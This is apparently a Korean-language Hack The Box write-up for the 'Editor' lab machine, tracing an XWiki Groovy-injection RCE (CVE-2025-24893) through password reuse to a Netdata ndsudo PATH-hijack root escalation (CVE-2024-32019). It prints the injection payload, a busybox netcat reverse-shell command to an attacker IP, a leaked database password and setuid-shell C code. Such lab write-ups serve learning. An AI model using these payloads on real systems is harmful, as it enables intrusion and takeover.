---
title: "Editor (Easy)"
date: 2025-12-07
layout: single
excerpt: "Editor는 Easy 난이도의 Linux 머신으로, XWiki의 SolrSearch 매크로에 존재하는 인증되지 않은 RCE(CVE-2025-24893)를 통해 초기 접근이 가능하다. 이후 XWiki 설정 파일에서 데이터베이스 자격 증명을 획득하고, 비밀번호 재사용을 통해 다른 사용자(oliver) 계정으로 이동한다. 마지막으로 Netdata의 SUID 바이너리 ndsudo에 존재하는 로컬 권한 상승 취약점(CVE-2024-32019)을 악용하여 루트 권한을 획득한다."
author_profile: true
toc: true
toc_label: "Editor"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/editor/editor.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, hackthebox, linux, web, xwiki, rce, cve-2025-24893, credential-reuse, lateral-movement, netdata, cve-2024-32019, suid, path-hijacking, priv-esc]
---

![Editor](/assets/htb-linux/editor/editor.png)

**Editor**는 Easy 난이도의 Linux 머신으로, XWiki의 SolrSearch 매크로에 존재하는 인증되지 않은 **RCE(CVE-2025-24893)**를 통해 초기 접근이 가능하다. 

이후 XWiki 설정 파일에서 **데이터베이스 자격 증명**을 획득하고, 비밀번호 재사용을 통해 다른 사용자(`oliver`) 계정으로 이동한다. 

마지막으로 Netdata의 SUID 바이너리 `ndsudo` 에 존재하는 **로컬 권한 상승 취약점(CVE-2024-32019)**을 악용하여 루트 권한을 획득한다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.231.23`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.11.28 | tee nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 08:10 EST
Nmap scan report for editor.htb (10.129.11.28)
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.90 seconds
```

Nmap 스캔 결과, SSH(`22`)와 두 개의 HTTP(`80`, `8080`)가 노출되어 있음을 확인하였다.

`80` 포트에서는 **nginx 서버(Version 1.18.0)**가 구동 중이고, `8080` 포트에선 **Jetty 서버(Version 10.0.20)**에서 XWiki 서비스가 구동 중이다.

---

# Vulnerability Analysis

## editor.htb (Port 80)

![Editor](/assets/htb-linux/editor/80-website.png)

`80` 번 포트에 접속하면 SimplistCode Pro 다운로드 페이지가 나타난다.

다운로드 안내 외에는 별다른 기능이 없어, 이 페이지에서는 더 살펴볼 부분이 없어 보였다.

## editor.htb (Port 8080)

![Editor](/assets/htb-linux/editor/8080-website.png)

`8080` 번 포트에 접속하면 SimplistCode Pro와 관련된 XWiki 사이트가 나타난다.

페이지 하단을 통해 **XWiki Debian 15.10.8 버전**을 사용 중임을 확인할 수 있다.

### XWiki SolrSearch Macro Unauthenticated RCE (CVE-2025-24893)

현재 사용 중인 XWiki 버전에는 인증 없이 원격 코드 실행이 가능한 [CVE-2025-24893](https://jira.xwiki.org/browse/XWIKI-22149) 취약점이 존재한다.

XWiki에는 `/xwiki/bin/get/Main` 경로에 전체 텍스트 검색 기능을 제공하는 `SolrSearch` 매크로가 존재하며, 해당 매크로는 XWiki의 스크립팅 엔진을 통해 동적으로 렌더링된다.

`SolrSearch` 매크로에서 사용되는 `text` 파라미터가 필터링 없이 RSS 피드 생성 과정에 사용되며, 이 값이 XWiki 템플릿 렌더러에 의해 스크립트로 해석된다.

`media=rss` 조건 하에서 해당 취약점을 통해 인증되지 않은 원격 코드 실행이 가능하다.

또한 [text 파라미터](https://cve.circl.lu/cve/CVE-2025-24893)에 아래의 코드를 삽입할 경우, 응답에 `Hello from search text:42` 문자열이 출력된다면 해당 XWiki 환경은 취약한 것으로 판단할 수 있다:

```groovy
}}}{{async async=false}}{{groovy}}println("Hello from" + " search text:" + (23 + 19)){{/groovy}}{{/async}}
```

위 Groovy 페이로드를 URL 인코딩하여 `text` 파라미터로 전달하면, 응답 내에 `Hello from search text:42` 문자열이 출력되는 것을 확인할 수 있다:

![Editor](/assets/htb-linux/editor/payload.png)

---

# Exploitation

## Command Injection (RCE)

`CVE-2025-24893` 을 이용한 RCE를 위해 [공개된 PoC 코드](https://github.com/gunzf0x/CVE-2025-24893)를 다운로드하였다.

먼저 로컬 환경에서 `netcat` 을 이용해 리버스 셸 수신 대기 상태를 구성하였다:

```bash
$ nc -lvnp 9001
```

이후 PoC 스크립트에 대상 URL과 실행할 명령을 인자로 전달하여 공격을 수행하였다:

```bash
$ python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.76 9001 -e /bin/bash'

[*] Attacking http://editor.htb:8080
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.76%209001%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed
```

그 결과, 정상적으로 `netcat` 리스너로 리버스 셸을 획득할 수 있었다:

```bash
$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.231.23] 33412

xwiki@editor:/usr/lib/xwiki-jetty$
```

---

# Privilege Escalation

## Lateral Movement: xwiki → oliver

`/etc/xwiki` 경로에서 XWiki 관련 설정 파일들이 다수 확인되었다:

```bash
xwiki@editor:/etc/xwiki$ ls -l

drwxr-xr-x 3 root root  4096 Jun 13  2025 cache
drwxr-xr-x 2 root root  4096 Mar 27  2024 extensions
drwxr-xr-x 2 root root  4096 Jul 29 11:48 fonts
-rw-r--r-- 1 root root 16171 Jun 16  2025 hibernate.cfg.xml
-rw-r--r-- 1 root root 16173 Jun 16  2025 hibernate.cfg.xml.ucf-dist
-rw-r--r-- 1 root root  2426 Mar 27  2024 jboss-deployment-structure.xml
-rw-r--r-- 1 root root  2172 Jun 30 12:43 jetty-ee8-web.xml
-rw-r--r-- 1 root root  2403 Mar 27  2024 jetty-web.xml
-rw-r--r-- 1 root root  3835 Mar 27  2024 logback.xml
drwxr-xr-x 3 root root  4096 Jun 13  2025 observation
-rw-r--r-- 1 root root  2076 Mar 27  2024 portlet.xml
-rw-r--r-- 1 root root  1328 Mar 27  2024 sun-web.xml
-rw-r--r-- 1 root root    16 Mar 27  2024 version.properties
-rw-r--r-- 1 root root 16448 Jul 29 11:48 web.xml
-rw-r--r-- 1 root root 25653 Jul 29 11:48 xwiki.cfg
-rw-r--r-- 1 root root   119 Mar 27  2024 xwiki-locales.txt
-rw-r--r-- 1 root root 78535 Jul 29 11:48 xwiki.properties
-rw-r--r-- 1 root root  2350 Jun 15  2025 xwiki-tomcat9.xml
```

### Credential Discovery

설정 파일 중 `hibernate.cfg.xml` 파일에서 중요한 설정 항목을 확인할 수 있었다:

```xml
<!-- Configuration for the default database.
         Comment out this section and uncomment other sections below if you want to use another database.
         Note that the database tables will be created automatically if they don't already exist.

         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
         engines) you will also have to set the property xwiki.db in xwiki.cfg file
    -->
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

    <property name="hibernate.connection.charSet">UTF-8</property>
    <property name="hibernate.connection.useUnicode">true</property>
    <property name="hibernate.connection.characterEncoding">utf8</property>

    <mapping resource="xwiki.hbm.xml"/>
    <mapping resource="feeds.hbm.xml"/>
    <mapping resource="instance.hbm.xml"/>
    <mapping resource="notification-filter-preferences.hbm.xml"/>
    <mapping resource="mailsender.hbm.xml"/>
```

해당 파일에서 MySQL 데이터베이스 접속에 사용되는 자격 증명이 확인되었다.

그러나 데이터베이스 내부에는 추가적인 공격에 활용할 만한 중요한 정보는 존재하지 않았다.

다만, 해당 자격 증명의 비밀번호가 재사용되고 있을 가능성을 고려하여 `/etc/passwd` 에서 확인한 사용자 `oliver` 계정으로 SSH 접속을 시도하였다.

그 결과, 동일한 비밀번호를 이용해 정상적으로 SSH 접속에 성공하였다:

![Editor](/assets/htb-linux/editor/oliver-shell.png)

## Lateral Movement: oliver → root

### Internal Service Discovery

현재 시스템에서 열려 있는 포트를 확인하기 위해 `netstat` 을 실행하였다:

```bash
oliver@editor:~$ netstat -lntp
Active Internet connections (only servers)                                                                                                                                                                                                  
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                                                                                                            
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:38843         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                                                                                                           
tcp6       0      0 :::22                   :::*                    LISTEN      -                                                                                                                                                           
tcp6       0      0 :::8080                 :::*                    LISTEN      -                                                                                                                                                           
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      - 
```

로컬에서만 접근 가능한 `8125`, `38843`, `19999` 포트를 확인하고, SSH 포트 포워딩을 통해 해당 서비스들을 로컬로 전달하였다:

```bash
$ ssh oliver@10.129.231.23 -L 8125:localhost:8125 -L 38843:localhost:38843 -L 19999:localhost:19999
```

이 중 `19999` 포트로 웹 브라우저를 통해 접근하면, [Netdata](https://www.netdata.cloud/) 서비스의 웹 대시보드가 노출되는 것을 확인할 수 있다:

![Editor](/assets/htb-linux/editor/editor-website.png)

Netdata 대시보드 상단에 Agent 버전이 권장 버전(`v1.46.0`)보다 낮다는 경고 메시지가 표시되었으며,
현재 사용 중인 버전은 `v1.45.2` 인 것을 확인하였다:

![Editor](/assets/htb-linux/editor/version.png)

### Privilege Escalation via Netdata (CVE-2024-32019)

현재 이 버전은 `ndsudo` 도구에 존재하는 **[CVE-2024-32019](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) 로컬 권한 상승 취약점**에 영향을 받는다.

Netdata 관련 경로에서 `ndsudo` 바이너리를 확인한 결과, SUID 비트가 설정되어 있는 것을 확인할 수 있었다:

```bash
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ ls -l

-rwsr-x--- 1 root netdata   200576 Apr  1  2024 ndsudo
```

해당 바이너리는 SUID 비트가 설정되어 있어 `root` 권한으로 실행되며, 명령 실행 시 PATH 환경 변수를 신뢰하는 구조에서 발생한다.

`ndsudo` 바이너리에 `-h` 옵션을 지정하면, 지원되는 명령과 실행 방식에 대한 도움말이 출력된다:

```bash
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ ./ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

출력 내용을 통해 `nvme-list` 명령은 `nvme` 바이너리를 호출하며, 해당 실행 파일을 **절대 경로가 아닌 PATH 환경 변수를 기준**으로 탐색한 뒤, SUID가 설정되어 root 권한으로 실행될 수 있는 구조임을 알 수 있었다.

우선 로컬 터미널에서 간단한 C언어 코드를 만든 후, `nvme` 의 이름으로 컴파일을 하였다:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

```bash
$ gcc nvme.c -o nvme
```

해당 파일을 `wget` 으로 전송한 뒤 실행 권한을 부여하였다. 실행 권한을 부여해준뒤, 현재 경로를 PATH 앞에 두도록 환경 변수를 설정하였다:

```bash
oliver@editor:~$ chmod +x nvme
```

```bash
oliver@editor:~$ export PATH=$(pwd):$PATH
```

`ndsudo` 의 `nvme‑list` 명령을 호출하자, 루트 셸 획득에 성공하였다:

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

root@editor:/home/oliver#
```

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![Editor](/assets/htb-linux/editor/flag.png)




